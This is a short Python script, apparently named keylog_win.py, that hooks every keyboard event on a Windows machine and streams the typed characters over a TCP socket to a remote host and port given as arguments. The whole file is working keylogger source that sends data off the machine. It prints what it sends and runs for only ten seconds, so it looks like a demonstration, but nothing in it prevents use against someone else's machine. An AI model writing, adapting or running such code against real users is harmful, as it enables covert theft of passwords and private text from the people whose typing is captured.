import keyboard
import socket
import sys
import time

if len(sys.argv) != 3:
    print("Usage: python keylog_win.py <hostname> <port>")
    sys.exit(1)

hostname = sys.argv[1]
port = int(sys.argv[2])

def key_to_char(key):
    if key == 'space':
        return ' '
    elif key == 'enter':
        return '\n'
    elif key == 'tab':
        return '\t'
    elif key == 'backspace':
        return '\b'
    elif key == 'ctrl':
        return '^'
    elif key in {'alt', 'caps lock', 'num lock', 'scroll lock'}:
        return ''
    elif 'shift' in key:
        return ''
    else:
        return key

def stream_keys(hostname, port, duration=10):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((hostname, port))
            print(f"Streaming keystrokes for {duration} seconds...")

            def on_key(event):
                if event.event_type == 'down':
                    key = key_to_char(event.name if event.name else '')
                    if key:
                        print(f"Sending: {repr(key)}")
                        s.sendall(key.encode())

            keyboard_hook = keyboard.hook(on_key)
            time.sleep(duration)
            s.sendall('\n'.encode())
            keyboard.unhook(keyboard_hook)

            s.shutdown(socket.SHUT_WR)
            while True:
                data = s.recv(1024)
                if not data:
                    break
                print("Received:", data.decode())

    except Exception as e:
        print(f"Error: {e}")

stream_keys(hostname, port, duration=10) # Default duration is 10 seconds
